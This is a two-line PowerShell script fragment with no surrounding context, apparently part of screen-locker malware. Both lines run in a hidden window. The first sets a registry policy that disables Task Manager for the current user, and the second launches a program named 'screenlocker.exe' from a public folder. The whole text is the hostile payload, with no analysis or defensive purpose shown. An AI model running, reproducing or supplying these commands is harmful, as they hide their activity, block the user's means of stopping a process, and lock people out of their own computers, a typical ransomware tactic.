powershell -windowstyle hidden REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
powershell -windowstyle hidden start "" "C:\\Users\\Public\\Document\\screenlocker.exe"
